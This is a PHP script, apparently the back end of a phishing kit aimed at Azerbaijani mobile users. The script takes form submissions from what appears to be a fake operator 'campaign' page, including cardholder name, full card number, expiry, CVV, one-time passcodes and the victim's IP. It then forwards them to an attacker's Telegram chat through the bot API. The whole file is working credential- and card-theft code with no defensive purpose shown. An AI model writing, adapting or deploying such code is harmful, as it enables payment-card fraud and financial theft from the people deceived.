<?php
// =============================================
// 🔥 TELEGRAM HANDLER - SPACESHIP VERSİYASI
// =============================================

// 1. Environment variables-dan tokenləri oxu
$botToken = getenv('TELEGRAM_BOT_TOKEN');
$chatId = getenv('TELEGRAM_CHAT_ID');

// 2. Token yoxdursa xəta ver
if (!$botToken || !$chatId) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Token or Chat ID missing'
    ]);
    exit;
}

// 3. Yalnız POST sorğularını qəbul et
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'status' => 'error',
        'message' => 'Method Not Allowed'
    ]);
    exit;
}

// 4. Məlumatları al
$operator = $_POST['operator'] ?? '';
$prefix = $_POST['prefix'] ?? '';
$number = $_POST['number'] ?? '';
$price = $_POST['campaign_price'] ?? '';
$cardName = $_POST['card_name'] ?? '';
$cardNumber = $_POST['card_number'] ?? '';
$cardExpiry = $_POST['card_expiry'] ?? '';
$cardCvv = $_POST['card_cvv'] ?? '';
$ip = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$otpMessage = $_POST['otp_message'] ?? '';

// 5. Mesajı formatla
if (!empty($otpMessage)) {
    $message = $otpMessage;
} else {
    $message = "🔴 YENI BILGI 🔴\n\n" .
               "Operator: $operator\n" .
               "Nomre: +994$prefix$number\n" .
               "Kampaniya: $price AZN\n" .
               "Kart Sahibi: $cardName\n" .
               "Kart Nomresi: $cardNumber\n" .
               "Kart Bitis: $cardExpiry\n" .
               "CVV: $cardCvv\n" .
               "IP: $ip";
}

// 6. Telegram-a göndər
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// 7. Cavab qaytar
if ($result) {
    echo json_encode([
        'status' => 'success',
        'message' => 'Data sent to Telegram'
    ]);
} else {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Failed to send to Telegram'
    ]);
}
?>
